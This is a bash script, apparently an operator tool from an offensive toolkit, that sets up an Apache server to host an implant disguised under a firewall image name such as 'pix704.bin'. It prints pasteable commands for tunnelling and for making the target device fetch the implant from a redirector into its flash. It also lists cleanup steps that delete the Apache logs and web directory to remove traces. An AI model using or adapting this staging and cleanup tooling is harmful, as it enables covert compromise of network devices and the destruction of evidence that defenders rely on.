#!/bin/bash
#
# This script is used to configure Apache on your Opbox for FW Ops
#
# Change log: (Please mark changes here)
# 12/15/2010 - Script deployed 



echo "*****           Welcome to the Apache Set Up script             *****"
echo "***** Please ensure that your Implant is in /current/bin/FW/OPS *****"

echo -n "What is the name of your implant: "
read _implant

echo -n "What is it named on target (i.e. image.bin pix704.bin): "
read _name




# cd to the Apache tools directory
cd /current/bin/FW/TOOLS/Apache

# Run this first to get the RPM to install without issue
rpm -e httpd httpd-suexec mod_ssl apr-util

# Run this next to load apache rpm's
rpm -hiv *.rpm

# In this directory is modified versions of the config files
cp --reply=yes httpd.conf /etc/httpd/conf/httpd.conf
cp --reply=yes ssl.conf /etc/httpd/conf.d/ssl.conf

# Create a test html file
echo "<html><body>This is a test</body></html>" > /var/www/html/index.html

# Copying and renaming implant
cp --reply=yes /current/bin/FW/OPS/$_implant /var/www/html/$_name


# Set permissions for items in html directory
chmod 744 /var/www/html/*

# Start up the apache server
service httpd start

echo "Launching FireFox to verify setup"
firefox https://127.0.0.1:4443 &

chmod 744 /var/www/html/*

ls -lart /var/www/html/


echo "Some useful pasteables"
echo "----------------------"
echo " "
echo "-tunnel"
echo "r 443 127.0.0.1 4443"
echo " "
echo "copy https://<redirector>/$_name flash:/$_name"
echo " "


echo "Clean up run these:"
echo "service httpd stop"
echo "rpm -e httpd httpd-suexec mod_ssl apr-util"
echo "rm -rf /var/log/httpd /etc/httpd /var/www"


